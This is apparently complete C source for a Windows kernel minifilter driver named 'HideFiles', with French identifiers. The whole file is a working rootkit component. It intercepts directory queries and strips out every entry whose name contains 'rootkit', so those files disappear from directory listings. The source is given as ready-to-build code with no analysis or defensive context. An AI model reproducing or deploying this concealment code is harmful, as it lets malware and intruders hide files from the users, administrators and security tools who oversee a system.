#include <fltKernel.h>

#define HIDE_KEYWORD     L"rootkit"
#define HIDE_KEYWORD_LEN 7

#ifndef FileIdExtdBothDirectoryInformation
#define FileIdExtdBothDirectoryInformation ((FILE_INFORMATION_CLASS)60)
#endif

typedef struct _MY_FILE_ID_EXTD {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    ULONG         ReparsePointTag;
    BYTE          FileId[16];
    CCHAR         ShortNameLength;
    WCHAR         ShortName[12];
    WCHAR         FileName[1];
} MY_FILE_ID_EXTD, *PMY_FILE_ID_EXTD;

PFLT_FILTER g_filter = NULL;

static BOOLEAN doit_cacher(PWCHAR nom, ULONG len_bytes)
{
    ULONG nb_chars = len_bytes / sizeof(WCHAR);
    ULONG i, j;

    if (nb_chars < HIDE_KEYWORD_LEN)
        return FALSE;

    for (i = 0; i <= nb_chars - HIDE_KEYWORD_LEN; i++) {
        BOOLEAN ok = TRUE;
        for (j = 0; j < HIDE_KEYWORD_LEN; j++) {
            WCHAR a = nom[i + j];
            WCHAR b = HIDE_KEYWORD[j];
            if (a >= L'A' && a <= L'Z') a += (L'a' - L'A');
            if (b >= L'A' && b <= L'Z') b += (L'a' - L'A');
            if (a != b) { ok = FALSE; break; }
        }
        if (ok) return TRUE;
    }
    return FALSE;
}

static BOOLEAN get_champs(PUCHAR e, FILE_INFORMATION_CLASS cls,
    PULONG next, PULONG namelen, PWCHAR *name)
{
    if (cls == FileBothDirectoryInformation) {
        PFILE_BOTH_DIR_INFORMATION p = (PFILE_BOTH_DIR_INFORMATION)e;
        *next = p->NextEntryOffset;
        *namelen = p->FileNameLength;
        *name = p->FileName;
        return TRUE;
    }
    if (cls == FileIdBothDirectoryInformation) {
        PFILE_ID_BOTH_DIR_INFORMATION p = (PFILE_ID_BOTH_DIR_INFORMATION)e;
        *next = p->NextEntryOffset;
        *namelen = p->FileNameLength;
        *name = p->FileName;
        return TRUE;
    }
    if (cls == FileIdExtdBothDirectoryInformation) {
        PMY_FILE_ID_EXTD p = (PMY_FILE_ID_EXTD)e;
        *next = p->NextEntryOffset;
        *namelen = p->FileNameLength;
        *name = p->FileName;
        return TRUE;
    }
    return FALSE;
}

FLT_POSTOP_CALLBACK_STATUS post_dir_ctrl(
    _Inout_ PFLT_CALLBACK_DATA data,
    _In_ PCFLT_RELATED_OBJECTS obj,
    _In_opt_ PVOID ctx,
    _In_ FLT_POST_OPERATION_FLAGS flags)
{
    PFLT_IO_PARAMETER_BLOCK iopb = data->Iopb;
    FILE_INFORMATION_CLASS cls;
    PUCHAR buf, cur, prev;

    UNREFERENCED_PARAMETER(obj);
    UNREFERENCED_PARAMETER(ctx);
    UNREFERENCED_PARAMETER(flags);

    if (iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
        return FLT_POSTOP_FINISHED_PROCESSING;

    if (!NT_SUCCESS(data->IoStatus.Status) || data->IoStatus.Information == 0)
        return FLT_POSTOP_FINISHED_PROCESSING;

    cls = iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;
    buf = (PUCHAR)iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
    if (!buf)
        return FLT_POSTOP_FINISHED_PROCESSING;

    cur  = buf;
    prev = NULL;

    for (;;) {
        ULONG next, namelen;
        PWCHAR name;
        BOOLEAN last, hide;

        if (!get_champs(cur, cls, &next, &namelen, &name))
            break;

        last = (next == 0);
        hide = doit_cacher(name, namelen);

        if (hide) {
            DbgPrint("HideFiles: cache %.*S\n", namelen / 2, name);

            if (prev == NULL) {
                if (last) {
                    data->IoStatus.Information = 0;
                    break;
                } else {
                    PUCHAR suivant = cur + next;
                    ULONG reste = (ULONG)(data->IoStatus.Information - (suivant - buf));
                    RtlMoveMemory(cur, suivant, reste);
                    continue;
                }
            } else {
                if (last)
                    *((PULONG)prev) = 0;
                else
                    *((PULONG)prev) += next;

                if (last) break;
                cur += next;
                continue;
            }
        }

        if (last) break;
        prev = cur;
        cur += next;
    }

    return FLT_POSTOP_FINISHED_PROCESSING;
}

CONST FLT_OPERATION_REGISTRATION callbacks[] = {
    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, post_dir_ctrl },
    { IRP_MJ_OPERATION_END }
};

NTSTATUS unload_cb(_In_ FLT_FILTER_UNLOAD_FLAGS flags)
{
    UNREFERENCED_PARAMETER(flags);
    if (g_filter) {
        FltUnregisterFilter(g_filter);
        g_filter = NULL;
    }
    DbgPrint("HideFiles: decharge\n");
    return STATUS_SUCCESS;
}

CONST FLT_REGISTRATION reg = {
    sizeof(FLT_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0, NULL,
    callbacks,
    unload_cb,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
};

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT drv, _In_ PUNICODE_STRING reg_path)
{
    NTSTATUS st;
    UNREFERENCED_PARAMETER(reg_path);

    st = FltRegisterFilter(drv, &reg, &g_filter);
    if (!NT_SUCCESS(st)) {
        DbgPrint("HideFiles: FltRegisterFilter echec %08X\n", st);
        return st;
    }

    st = FltStartFiltering(g_filter);
    if (!NT_SUCCESS(st)) {
        FltUnregisterFilter(g_filter);
        g_filter = NULL;
        return st;
    }

    DbgPrint("HideFiles: charge\n");
    return STATUS_SUCCESS;
}
